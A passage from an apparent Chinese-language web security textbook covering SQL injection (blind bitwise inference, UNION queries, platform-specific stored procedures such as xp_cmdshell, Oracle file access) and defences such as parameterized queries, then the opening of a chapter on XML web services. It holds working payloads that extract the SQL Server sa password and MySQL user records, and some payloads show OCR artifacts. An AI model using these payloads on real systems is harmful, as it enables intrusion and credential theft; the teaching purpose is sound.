SELECT price FROM Products WHERE ProductId=(SELECT 5435+(SELECT COUNT(user) FROM mysql.user WHERE user=0x726f6f74))

该技术可以在任何数据库和任何特定的 SELECT 语句中使用。基本上，我们只改变语句，使得它返回一个数字（或者真/假）。

SELECT price FROM Products WHERE ProductId=(SELECT 5435+(SELECT COUNT(*) FROM SomeTable WHERE column=value))

子语句可以进一步扩展，这样你不仅能以此推断 SELECT 语句执行成功或失败，还可以用来枚举值，虽然慢了点，但也是种迂回的方法。比如，你可以从一个定制的 SELECT 子查询出发，使用按位枚举获取任意字段的值。该方法基于这样的原理：当注入 AND 1=1 和 AND 1=0 时，可以区分不同的服务器响应。

按位枚举对被测试值中的每一位进行测试，以确定它是否设置（AND 1=1）或未被设置（AND 1=0）。比如，下面是一个对字符'a'（ASCII 0x61）的按位比较，确定该值这需要对应用程序进行8次请求。（事实上，ASCII文本只使用了7位，但出于完整性我们讨论了所有的8位）：

0×61 & 1 = 1
0×61 & 2 = 0
0×61 & 4 = 0
0×61 & 8 = 0
0×61 & 16 = 0

0×61 & 32 = 32
0×61 & 64 = 64
0×61 & 128 = 0
0×61 = 01100001 (binary)

SQL 注入子查询的比较模板的伪代码如下所示。需要两个循环：一个循环枚举字符串的每一个字节（i），另一个循环枚举字节的每位（n）：

for i = 1 to length(column result):
    for p = 0 to 7:
        n = 2**p
    AND n IN (SELECT CONVERT(INT, SUBSTRING(column,i,1)) & n FROM clause

这创建了如下所示的一系列子查询：

AND 1 IN (SELECT CONVERT(INT, SUBSTRING(column, i, 1)) & 1 FROM clause AND 2 IN (SELECT CONVERT(INT, SUBSTRING(column, i, 1)) & 2 FROM clause AND 4 IN (SELECT CONVERT(INT, SUBSTRING(column, i, 1)) & 4 FROM clause ...
AND 128 IN (SELECT CONVERT(INT, SUBSTRING(column, i, 1)) & 128 FROM clause

最后,用来枚举 Microsoft SQL Server 数据库中 sa 用户密码的查询是下面这个样子(你可能需要对 384 个请求的每个位置 i 迭代 48 次, n 迭代 8 次)。sa 用户是 SQL Server 数据库的内置管理员账号, 可以认为是类似于 UNIX 的 root 用户或 Windows 的 Administrator 用户。因此, 如果 sa 用户的密码可以通过一个 Web 应用程序提取出来, 将是非常危险的事情。返回的响应如果与注入的 AND 1=1 匹配, 那么该位置的 n 等于 1。

AND n IN
(
SELECT CONVERT(INT,SUBSTRING(password,i,1)) & n
FROM master.dbo.sysxlogins
WHERE name LIKE 0x73006100
)

子语句利用复杂的 SQL 结构，推断 SELECT 语句的值。它们只受到内部数据访问控制的限制，而且字符串可以包含在载荷中。

联合（UNION）

SQL UNION 操作符把两个不同的 SELECT 语句的结果合并起来。这使得开发者可以仅用一个单独的查询，便能获得来自不同表的数据。下面是使用 UNION 语句的一个简单例子，会返回一条有三个字段的记录：

SELECT c1, c2, c3 FROM table1 WHERE foo=bar UNION

SELECT d1, d2, d3 FROM table2 WHERE this=that

对 UNION 操作符的主要约束是每条记录的字段数目必须是匹配的。这并不是非常难克服的事情；暴力破解只需要一些耐心。

如果字段少计了，即第二个 SELECT 语句的字很少，很容易解决。任何 SELECT 语句都会接受重复的字段名或值。举个例子，下面都是合法的查询，会返回四个字段：

SELECT c,c,c,c FROM table1
SELECT c,1,1,1 FROM table1
SELECT c,NULL,NULL,NULL FROM table1

字段多计了，即第二个 SELECT 语句的字段太多，也很容易解决。在这种情况下，使用 CONCAT()函数把所有的结果连接为一个单独的字段：

SELECT CONCAT(a,b,c,d,e) FROM table1

让我们看看如何在 SQL 注入攻击中使用 UNION 操作符。了解 UNION 针对 Web 应用程序是如何工作的是很容易的一件事情。首先，我们会验证一个参数是否有 SQL 注入漏洞。我们通过添加一个字母在数字参数末尾来验证。这将导致一个错误，如图 7-5 所示。注意，错误提供了关于原始查询的详细信息——尤其是在初始 SELECT 中的字段数目——12。

 </div>

我们也可以使用“盲”技术，通过对比下面两个 URL 的结果，来测试该漏洞。

http://Website/freznoshop-1.4.1/product_details.php?id=43

http://Website/freznoshop-1.4.1/product_details.php?id=MOD(43,44)

下面的这个 URL 也可以产生一个错误（注意 MOD() 函数的非法使用）

http://Website/freznshop-1.4.1/product_details.php?id=MOD(43,a)

在任何情况下，下一步都是使用 UNION 操作符来从数据库获得一些信息。第一步是匹配字段的数目。我们用两个不同的请求验证数目（12）。我们会继续使用 http://Website/freznoshop-1.4.1/这个 URL。当包含 UNION 语句时，完整的 URL 有点长。因此，我们将只显示 id 参数是如何修改的而不包含全部的 URL。我们知道需要 12 个字段，但为了演示 UNION 字段集不匹配时的错误，我们提交一个有 11 个字段的请求。

 $$ \mathrm{id}=43+\mathrm{UNION}+\mathrm{SELECT}+1,1,1,1,1,1,1,1,1,1/* $$ 

图 7-6 显示了当 id 值提交到应用程序时所返回的错误。注意：错误明确叙述了字段数目不匹配：

 $$  id=43+UNION+SELECT+1,1,1,1,1,1,1,1,1,1,1,1/* $$ 

 </div>

如果我们修改 id 参数，在 UNION 右方带 12 个字段，那么查询在语法上是合法的，我们会收到 id=43 的页面。图 7-7 显示了无错误出现时的页面。

当然，使用 UNION 操作符的真正原因是为了获得任意数据。到现在，我们只是成功地发现了一个漏洞和匹配的字段数目。既然我们的例子应用程序使用的是 MySQL 数据库，我们就来尝试获取 MySQL 中的用户证书。MySQL 以与 Microsoft SQL Server 不同的方式保存数据库相关账号，但我们现在能够访问默认表名和字段。注意到图 7-8 中的响应，表中有一项叫做 “1.: root”——这是 UNION 查询返回的用户名（root）。下面是提交给 id 参数的值：

## id=43+UNION+SELECT+1,cast(user+AS+CHAR(30)),1,1,1,1,1,1,1,1,1,1+FROM+mysql.user/*

 </div>

曰

 </div>

当然，这里有一些必要的中间步骤来获得前面 id 的值。最初的测试可以用下面的条目开始：

 $$ \mathrm{id}{=}43^{\prime} $$ 

 $$ \mathrm{id}{=}43/* $$ 

然后继续使用 UNION 语句获取任意表中的数据。在这个例子中，在 UNION 语句右端，需要创建一个有 12 个字段的 SELECT，来匹配 UNION 左端的字段数目。一般通过试验和错误信息获得该数目，比如，尝试一列，再二列，然后三列，如此继续。最后，会发现第二个字段的结果会显示在 Web 应用中，这就是其他字段用 “1” 占位符的原因。

提示 需要使用 CAST()函数把 MySQL 内部存储类型（utf8_bin）转换为应用程序期望的存储类型（latin1_Swedish_ci）。CAST() 函数是 SQL2003 标准的一部分，所有主流数据库均支持。是否必要使用此函数取决于平台本身。

就像很多 SQL 注入技术一样，当参数值没有被单引号包含（对数字参数也一样），或者单引号可以作为载荷的一部分包含时，UNION 的效果最佳。当能够使用 UNION 时，步骤非常简单：

确认漏洞。

在最初 SELECT 查询中匹配字段数目。

○ 创建一个定制的 SELECT 查询。

#### 枚举（Enumeration）

所有的数据库都有一组关于它的安装和用户的信息。即使不能确定特定应用程序的数据位置，也有很多表和其他信息可以用来枚举，以此确定版本、补丁和用户。

#### 7.3.3 平台

本章致力于介绍数据存储和对所有平台通用的 SQL 注入攻击。当然，应用程序的语言和数据库类型与版本，会影响到某些攻击的成功。在本节中，我们讨论一些特定平台的扩展，这些扩展可以被攻击所利用。

#### Microsoft Access 数据库

在一个高性能商业应用中，不大可能遇到一个 MS Access 数据库，但这不意味着该数据库后端对 Web 应用无用。Access 支持大量的 SQL 子集，以及和 Microsoft SQL Server 类似的行为，但它没有同样的记录系统信息的数据库或存储过程。通过请求下面列出的表中的字段，可能识别出 Access 数据库。你不能从它们中获取信息，但它们的存在可以确定后端是 MS Access。

o MSysACEs

o MSysObjects

o MSysAccessObjects

o MSysQueries

o MSysAccessXML

Microsoft SQL Server

MS SQL Server 是一个流行的数据库，有一些扩展存储过程，提供了对操作系统、网络和 Windows 域的访问。SQL Server 同样有一些内部变量，可以暴露数据库的平台和版本。每个变量可以通过以下这个语法来查询：

SELECT @@variable

下面是一些变量，最有用的是它们返回一条记录或者提供有用的信息。

o @@language

o @@microsoftversion

o @@servername

o @@servicename

o @@version

存储过程 SQL Server 包含了少量不需要经过 master..数据库用户就可以调用的存储过程。默认情况下，查询是针对当前数据库中的表进行的。比如，一个电子商务应用，可能有一个数据库叫做 “Books”，另一个数据库叫做 “Users”。而另一方面，Master 表在所有配置中都会出现，并包含了定义表、字段、数据类型和内置过程所需要的数据。因此，这些存储过程简明扼要但又能提供足够有用的信息。表 7-12 包含了存储过程的一个列表，这些存储过程同样用于枚举用户、表和定制的存储过程。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>存储过程</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_columns &lt;table&gt;</td><td style='text-align: center; word-wrap: break-word;'>最重要的是，返回一个表的字段名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_configure [name]</td><td style='text-align: center; word-wrap: break-word;'>返回内部数据库设置。指定一个特殊的设置，以用来检索那个值。比如，sp_configure &#x27;remote query timeout (s)&#x27;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_dboption</td><td style='text-align: center; word-wrap: break-word;'>查看（或设置）用户个人配置的数据库选项</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_depends &lt;object&gt;</td><td style='text-align: center; word-wrap: break-word;'>列出与一个存储过程相关的表</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_helptext &lt;object&gt;</td><td style='text-align: center; word-wrap: break-word;'>描述对象。对识别可执行存储过程的区域更有用。它很少能执行成功</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_helpextendedproc</td><td style='text-align: center; word-wrap: break-word;'>列出所有的扩展存储过程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_spaceused [object]</td><td style='text-align: center; word-wrap: break-word;'>不带参数会返回数据库名称、大小以及未分配的空间。如果指定了一个对象，它会描述行和其他相关信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_who2 [username]</td><td rowspan="2">sp_who2 比它的数字同类高级很多。它显示用户名、已经连接的主机、用于连接数据库的应用程序、当前在这个数据库中执行的命令，以及一些其他信息。这两个存储过程都接受一个用户名选项。这是列举 SQL 数据库而不是应用程序用户的很好方法</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_who</td></tr></table>

扩展存储过程，以“xp_”前缀为标志，是 SQL 提供的强健的系统管理。我们会在本章最后讨论对抗措施，但在此给一个提示，一种对抗措施是删除所有的这些命令。表 7-13 列出了一些不需要参数的存储过程。表 7-14 列出了一系列需要参数的存储过程。你不是总能执行需要参数的 SQL 语句，这由注入点决定。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>存储过程</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_loginconfig</td><td style='text-align: center; word-wrap: break-word;'>显示登录信息，特别是登录模式（混和等等）和默认登录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_logininfo</td><td style='text-align: center; word-wrap: break-word;'>显示当前登录的账号。只对 NTLM 账号适用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_msver</td><td style='text-align: center; word-wrap: break-word;'>列出 SQL 版本和平台信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_enumdnsn</td><td style='text-align: center; word-wrap: break-word;'>枚举 ODBC 数据源</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_enumgroups</td><td style='text-align: center; word-wrap: break-word;'>枚举 Windows 组</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_ntsec_enumdomains</td><td style='text-align: center; word-wrap: break-word;'>枚举网络上存在的域</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>存储过程</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_cmdshell &lt;command&gt;</td><td style='text-align: center; word-wrap: break-word;'>等同于 cmd.exe，换句话说，是数据库服务器的完全命令行访问。Cmd.exe是假设已存在，因此你只需要输入 dir 来获得一个目录列表。默认的当前目录是 %SYSTEMROOT%\System32</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_regread &lt;rootkey&gt;, &lt;key&gt;, &lt;value&gt;</td><td style='text-align: center; word-wrap: break-word;'>读取一个注册表的值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_reg*</td><td style='text-align: center; word-wrap: break-word;'>这里有一些其他注册表相关的存储过程，读取值是最有用的</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_servicecontrol &lt;action&gt;, &lt;service&gt;</td><td style='text-align: center; word-wrap: break-word;'>启用或停止一个 Windows 服务</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_terminate_process &lt;PID&gt;</td><td style='text-align: center; word-wrap: break-word;'>基于进程 ID 杀掉一个进程</td></tr></table>

这几个命令覆盖了系统级访问的所有方面。而且，在你尝试使用xp_regread 获取 SAM 文件前，应用程序就知道该技术只在没启用 Syskey 的系统中才有效。Windows 2000 默认是启用了该技术的。

默认本地表 也被称为系统表对象（System Table Objects），这些表包含有关数据库和操作系统的信息。表 7-15 列出了那些含有最有用信息的表。

从这些表中获得信息的最简单方法是使用一个 SELECT *语句，比如：

 $$ \mathrm{S E L E C T~*~F R O M~s y s f i l e s} $$ 

但是，如果你熟悉数据库，你也可以将请求缩小到某几个的字段。比如，查看所有的存储过程，使用：

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>表</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Syscolumns</td><td style='text-align: center; word-wrap: break-word;'>当前数据库的所有字段名称和存储过程，不仅仅是 master 表</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sysobjects</td><td style='text-align: center; word-wrap: break-word;'>数据库中的每个对象（比如存储过程）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sysusers</td><td style='text-align: center; word-wrap: break-word;'>可以操纵数据库的所有用户</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sysfiles</td><td style='text-align: center; word-wrap: break-word;'>当前数据库和日志文件的文件名和路径</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Systypes</td><td style='text-align: center; word-wrap: break-word;'>SQL 定义的数据类型或用户定义的新类型</td></tr></table>

表 7-16 列出了从 master 数据库中选出的表。这些表提供了关于操作系统和数据库配置的详细信息。在这些表上执行的 SELECT 语句往往需要使用 “master.” 提示：

 $$ \mathrm{S E L E C T~*~F R O M~m a s t e r.}.{\mathrm{s y s d e v i c e s}}. $$ 

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>表</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sysconfigures</td><td style='text-align: center; word-wrap: break-word;'>当前数据库配置设置</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sysdevices</td><td style='text-align: center; word-wrap: break-word;'>枚举数据库、日志和临时文件使用的设备</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Syslogins</td><td style='text-align: center; word-wrap: break-word;'>枚举每个允许访问数据库的用户的信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sysremotologins</td><td style='text-align: center; word-wrap: break-word;'>枚举每个允许远程访问数据库或存储过程的用户的信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sysservers</td><td style='text-align: center; word-wrap: break-word;'>列出服务器可以作为 OLE 数据库服务器访问的所有对等服务器</td></tr></table>

##### MySQL

MySQL 是一个强大的开源数据库平台。最近的 5.0 系列添加了诸如存储过程、触发器和视图等被商业数据库使用多年的功能。MySQL 支持大部分 SQL 2003 规范，并添加了一些有趣的扩展。

可能 MySQL 中最有趣的扩展是在何种情况下真正的忽略注释。这是一个特殊的语法，可以导致嵌入在注释符里的 SQL 语句被执行。该设计是为了方案（schema）的向下兼容。它也被认为是一个有用的枚举工具。这些特殊注释的语法需要依赖于数据库的版本信息。下面这个例子会在版本 3.23.00 或更高版本的 MySQL 数据库上执行 SELECT 语句。

 $$ /*!32300\ \mathrm{S E L E C T\ user\ FROM\ mysql.user*/} $$ 

版本由主版本号、子版本号和编译版本号构成，并以感叹号（！）为前缀。因此，版本4.1.15看起来是/*!40115 SELECT...*/，而版本5.0.15则是/*!50015 SELECT...*/。这项技术不能使你执行任何特殊的SQL语句，但它能让你通过尝试如下的查询，确定所使用的MySQL的详细版本信息。

 $$ /*\text{!}32310\quad\text{AND}\quad0\quad*/ $$ 

/*!40026 AND 0 */
/*!50000 AND 0 */

另一个 MySQL 的有用扩展是支持 LIMIT 操作符。它可以用来限制查询返回记录的数目，也可以用来对一个结果集的任意记录索引。当需要浏览结果集时，它和 UNION 一起使用特别有效。

Oracle

Oracle 数据库和支持的应用程序有相当大数量的缓冲区溢出漏洞，但在本章中不进行明确的叙述。如果可以直接访问数据库（TNS listener）或通过 Oracle 的 Web 界面访问，大部分漏洞都是可以利用的。其中很多都写成文档在 http://www.ngssoftware.com/advisory.htm 中。

Oracle 有一些系统表，你可以用来获取 Schema 和账号信息。获取用户账号名的最简单方法是：

SELECT username FROM ALL_USERS;

Oracle 提供了可以写入到文件系统的命令，但是，你能否成功执行它们则由用户连接的访问级别决定。这里有一些简单的文件枚举技巧，你可以在一行 SQL 语句中执行。举个例子，你可以尝试复制参数文件（PFILE 和 SPFILE）到一个已知位置，或者从一个已知的位置复制参数文件。遗憾的是，这常常会返回语法错误，因为 boot.ini 或 (/etc/ passw 等) 不是正确的格式。

SQL> CREATE SPFILE = 'bar' FROM PFILE = 'c:\\boot.ini';
CREATE SPFILE = 'bar' FROM PFILE = 'c:\\boot.ini';
*
ERROR at line 1:
ORA-01078: failure in processing system parameters
LRM-00110: syntax error at '[boot'

对那些少数敢冒着写入到数据库文件系统的危险的勇士，下列命令很有用的：

CREATE DIRECTORY somedir AS '/path/to/dir';
CREATE TABLE foo (bar varchar22(20)) ORGANIZATION EXTERNAL (TYPE oracle_loader DEFAULT DIRECTORY somedir LOCATION ('somefile.dat');

这里也有 UTL_FILE 命令，不过要求多条语句和左值。换句话说，你需要能够创建和追踪变量。

DECLARE
fh UTL_FILE.FILE_TYPE;
BEGIN
fh := UTL_FILE.fopen('/some/dir', 'file.name', 'W'); -- 'W' rite

UTL_FILE.PUTF(fh, somedata);
UTL_FILE.FCLOSE(fh);
END

因此，攻击可以写表数据到某个文件，或者读某个文件的内容到一个表。

关于 Oracle 攻击和对抗措施的大量文档, 可以在 http://www.petefinnigan.com/orasec.htm 找到。

### 7.4 其他数据存储攻击

SQL 注入是到目前为止针对数据库最有趣的攻击，但并不是唯一的攻击。其他攻击可以利用在分类或表中不完备的安全策略。毕竟，如果你可以通过把 URL 参数从 655321 修改为 24601，访问到某人的私人信息，那么就没有必要注入恶意字符或尝试一个替换语法。

依赖数据库访问的应用程序所面临的最大挑战，是如何安全地存储证书。在很多平台上，证书以文本文件保存在 Web 文档根目录外。但是有些时候，证书可能硬编码在 Web 文档根目录内的应用程序源文件中。在后面这种情况下，用户名和密码证书的安全依赖于对源代码未授权访问的防范措施是否到位。

#### ☐ 对抗措施

应用程序的数据库包含了有关应用程序和用户的重要信息。重要的是，对抗措施要顶住那些针对数据库的各种攻击，并在特定的防御方法被证明不足时，尽量最小化攻击的影响。

#### 7.4.1 输入验证

过滤用户提供的数据可能是 Web 应用使用得最多的对抗措施。正确的输入验证不仅仅防范应用程序免受 SQL 注入攻击，也防范免受其他参数操纵攻击。对进入数据库的值进行输入验证是很棘手的事情。比如，我们已经演示了一个单引号是多么的危险，但是，你如何处理类似 O'Berry 的名字或者任何包含缩写的句子呢？

为数据库进行值边界的验证流程和过滤其他值的流程没有太大的区别，要记住下面的几点：

丢弃字符 诸如单引号（省略号）的字符在 SQL 查询中有特殊的含义。除非你百分之百的使用预处理语句或参数化查询，否则确保丢弃这些字符（比如，V）来防止它们破坏查询。

拒绝字符　你可以去除那些已知为恶意的或对预期数据来说不正确的字符。举个例子，一个 E-mail 地址应该只包含标点字符的特殊子集，它们不需要有括号。

使用正确的数据类型 只要有可能，把整数值赋给整数数据类型，对所有用户提供的数据都以此这样做。攻击者仍然可能产生一个错误消息，但是错误只可能在为参数赋值时发生，而不是在数据库中发生。

### 7.4.2 把查询数据从查询逻辑分离出来

输入验证很有用,但它不能解决 SQL 注入的根本问题: 使用查询数据来修改查询逻辑。大多数数据库和程序语言都提供了相关函数, 允许开发者静态定义查询的逻辑, 并把数据放到正确的位置。在编程语言中, 是用边界参数（bound parameters）或参数化查询（parameterized queries）来完成。数据库有同样的方法, 可以通过存储过程（stored procedure）或用户定义的函数（user-defined function）来完成。

#### 边界参数

使用边界参数（也称为参数化查询）的主要好处，是你不用担心丢弃特殊的字符或担心某些字符会改变查询的逻辑。虽然插入非法的字符仍可能产生一个错误，但是不能使用单引号来改写任意的查询。安全是有代价的，因为查询必须在最开始时构建（或是预设的），然后填入参数值。这会对性能造成影响，但是影响的严重性取决于应用程序的构架。事实上，安全的好处远远超出了性能的影响。在另一方面，参数化查询实际上可以将查询的执行性能提高数倍。

下面的例子演示了在一个 JDBC 连接中使用边界参数（name 变量包含了用户提供的数据）：

String query = "SELECT * FROM table WHERE something=?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, name);

ResultSet rs = stmt.executeQuery();

Java 使用问号作为查询中的参数占位符。setString（）方法用来给占位符绑定值。在前面的例子中，name 参数绑定给第一个（也是唯一一个）占位符。Java 有其他的方法涉及几种可能的数据类型，包括整数、NULL 和时间戳。应该为操纵的数据选择使用最恰当的方法。

.NET 平台提供了边界查询，但它的方法是使用变量引用而不是递增的占位符，如下面这个 C#例子所示：

Statement stmt = connection.CreateCommand();
stmt.CommandText = "SELECT * FROM table WHERE something=@name";
stmt.Prepare();
SqlParameter name;
name = stmt.Parameters.Add("@name", DbType.String);

name.value = <value taken from POST data>;
stmt.Execute();

就和 JDBC 一样, 你可以给参数赋予特殊的数据类型, 而不仅仅是 DbType.String 类型。表 7-17 列出了几种语言的参数化查询对象和函数的相关信息。

边界参数的优点是很明显的，它们提供了一些有用的功能：

○ 避免了使用不安全的字符串串接，因为它们可能很容易被攻击。

☐ 不要求对 SQL 语法字符，比如单引号，进行特殊的处理。

☐ 提供了强数据类型赋值。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>平台</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ADO.NET</td><td style='text-align: center; word-wrap: break-word;'>Statement 对象，Prepare，Parameters.Add 方法</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Java</td><td style='text-align: center; word-wrap: break-word;'>PreparedStatement 对象，setFoo 方法（setString、SetBoolean 等）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Perl DBI module</td><td style='text-align: center; word-wrap: break-word;'>Prepare, bind_param 方法</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PHP Data Objects (PDO)</td><td style='text-align: center; word-wrap: break-word;'>PDO 对象，Prepare，bindParam 方法</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PHP mysql</td><td style='text-align: center; word-wrap: break-word;'>mysql_prepare() mysql_stmt_bind_param()作为面向对象或存储类型可用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Python MySQLdb</td><td style='text-align: center; word-wrap: break-word;'>MySQLdb 对象，Execute 方法（可以使用占位符和变量赋值）</td></tr></table>

##### 存储过程

存储过程代表数据库中预定义的查询。一个存储过程接收输入参数并基于存储过程中定义的语句返回数据。存储过程可以包含有很多条件步骤的复杂语句，这和参数化语句一样，它们的查询逻辑与查询数据无关，保持不变。因此，存储过程不能通过用户提供的包含单引号、分号或注释符的数据来操纵。各个数据库间存储过程的语法可能有细微的不同，但语法也在 SQL 2003 标准中有明确定义。下面是一个非常简单的存储过程的例子，它检查特定用户名和密码哈希的组合，并返回匹配的数目：

CREATE PROCEDRE sp_FooBar(IN user VARCHAR(80), IN passwd CHAR(32), OUT i INT)
BEGIN
SELECT COUNT(id) INTO i FROM UserTable
WHERE UserName=user AND Password=passwd;
END

存储过程的真正好处体现在比这个例子复杂得多的查询中，但这个例子说明了基本的语法。

提示 记住，使用字符串串连来构建存储过程仍会导致 SQL 注入漏洞。存储过程的安全取决于参数是如何传递给存储过程的——如果退回到用字符串串连未过滤的用户输入，就会破坏该安全的基础。

不是所有的数据库都对 SQL 2003 存储过程提供完全的支持,PostgreSQL 和 MySQL 4.x 系列就是著名的例外。对这些数据库可以使用边界参数。

存储过程除了提供更加安全的方法来运行查询外，也带来了性能的提升，因为查询逻辑是预编译的，同时，也对存储过程基于角色访问也使得查询更安全。

#### 7.4.3 数据库加密

很多数据库提供本地函数来加密表和字段的信息。如果可以直接访问数据库文件，表级别的加密可以保护数据。字段级别的加密可以保护信息，只有数据的所有者才能解密信息。举个例子，一个字段可能代表用户的ID号，其他字段包含用户的私人信息（社会保险号码、银行账号信息、信用卡号码等）。如果除了ID字段，其他所有的字段都使用用户专有的密钥进行加密（需要用用户ID来执行查询），那么SQL注入攻击访问加密数据会更加困难。使用简单的SELECT或UNION语句攻击不同的用户，只会返回加密后的数据。

当然，无论表加密还是字段加密都不是完美的对抗措施。一个账号仍然存在被人窃取或猜测用户密码的危险。数据库加密只能减少用户的未授权活动（SQL 注入攻击），不能阻止一个未授权用户（窃取了账号的人）的授权活动（登录、查看信息页面、执行允许的交易等等）。

### 7.4.4 数据库配置

最后，如果没有对数据库的安装和分类进行安全配置，数据库安全是不完善的。有很多为主流数据库系统编写的检查列表。在此并非为每个数据库版本再重复一遍这些检查列表，而是给出关于这些检查列表的要点总结：

☐ 为数据库管理和访问分别设立专用账号。

☐ 使账号仅对与应用程序相关的表具有操作权限。

如果可能，使用只读账号。

☐ 删除高风险的存储过程和扩展函数。

☐ 使用最新的补丁。

### 7.5 小结

一次成功的 SQL 注入攻击是针对 Web 应用程序最具破坏性的攻击之一。这些攻击针对应用程序所操纵的数据源。如果数据库会被攻击，那么攻击者就可能不需要尝试暴力攻击、社会工程学或其他技术就可以获取未授权的访问和信息了。理解这些漏洞是如何被识别的非常重要，否则，对抗措施可能对某种类型的攻击有效，但对另一种类型的攻击就没有效果。最后，最佳的防范措施是在应用程序中使用边界参数（参数化语句）来构建查询，以及尽可能在数据库中使用存储过程。

## 第 8 章 攻击 XML Web 服务

就像我们在第 1 章中提到的那样，XML Web 服务仍是计算世界里最流行的技术，现在得到了包括 Microsoft，IBM 和 Sun 公司在内的 Internet 技术巨头的支持。Web 服务在理论上形成“粘合”，使不同的 Web 应用能顺畅地通信，而且只需极少的人工干预。就像 Microsoft 提出的那样，Web 服务提供了“在组织内部、跨企业和跨 Internet 连接，一个松散耦合的、与语言无关的、不依赖于平台的方法。”

在计算世界里，为了设计出一个完美的应用程序间通信协议，人们已经做了很多尝试，而且任何接触过 RPC，DCOM，CORBA 一段时间的人都会知道，虽然花费了很多精力，但还不能做到非常安全（虽然协议本身并不是很必要做到绝对安全，但它们至少应该使得应用程序的接口使用起来更加方便）。

那么 Web 服务是否会成为一个转折点，使得互联网上的应用从此更加安全呢？还是随着技术的成熟并扩散到整个网络，我们仅是站在 Web 攻击另一场革命的浪尖？本章首先讨论 Web 服务器究竟是什么，以及它如何被攻击的，以此来尝试回答这个问题。

### 8.1 什么是 Web 服务

简单地说，Web 服务是一个独立的软件组件，这些组件完成有特定的功能，并能够把关于它自己能力的信息发布给网络上的其他组件。Web 服务基于一组更高级的日趋完善的 Internet 标准，包括：Web 服务定义语言（Web Services Definition Language，WSDL），这是一种描述服务输出连接点的 XML 格式；统一描述、发现和集成（Universal Description, Discovery, and Integration, UDDI）规范，这是一组 XML 协议和一个描述和发现 Web 服务的基础结构的组合；简单对象访问协议（Simple Object Access Protocol，SOAP），一个基于 XML 的、用来在 Web 服务之间传递消息和进行 RPC 通信的协议。合理使用这三种技术，可以混合并匹配 Web 服务，并创造新的应用程序、流程和价值链。

注意 你可能已经注意到了可扩展标记语言（eXtensible Markup Language，XML）在Web服务中的核心地位——因为XML能很容易地将数据表达成结构化的形式，它为应用程序之间的通信提供了强大的支持。因此，Web服务经常被称为XML Web服务，尽管从技术上来说，Web服务并不一定需要XML才能实现。

更有吸引力的是，Web 服务提供了一种连贯的机制，可以减轻集成多个 Web 应用程序、协调传送数据、协议和平台的标准等繁重的劳动。Web 服务能描述自身的功能，并通过 WSDL、UDDI 和 SOAP 搜索出其他的 Web 服务，与之进行动态交互。因此，Web 服务提供了一种方法，使不同组织之间可以相互连接他们的应用程序，通过一个网络来完成动态的电子商务活动，而不管它们的应用程序、设计、或运行环境（ASP.NET，ISAPI，COM，PHP，J2EE 等）是怎样的。

如何区分 Web 服务和传统的 Web 站点呢？Web 服务的对象是在非智能的代理上，而不是在终端用户上。就像 Microsoft 所说的：“与 Web 站点、基于浏览器的交互或者依赖于平台的技术相比，Web 服务提供一种从计算机到计算机的服务，通过规定的格式和协议，以一个不依赖于平台和语言无关的方式进行。”

图 8-1 说明了 Web 服务是如何集成典型的 Web 应用结构中的（为了重点说明 Web 服务的角色，我们省略了一些原图中的细节），此 Web 应用程序结构在第 1 章有所描述。图 8-1 展示了在一个假想的公司 A 中的 Web 服务。假设公司 A 发布关于该公司应用程序的信息给其他公司（假设是公司 B）和互联网客户。我们来讨论下图中关于 Web 服务技术更重要的一些方面。

 </div>

#### 8.1.1 传输：HTTP(S)上的 SOAP

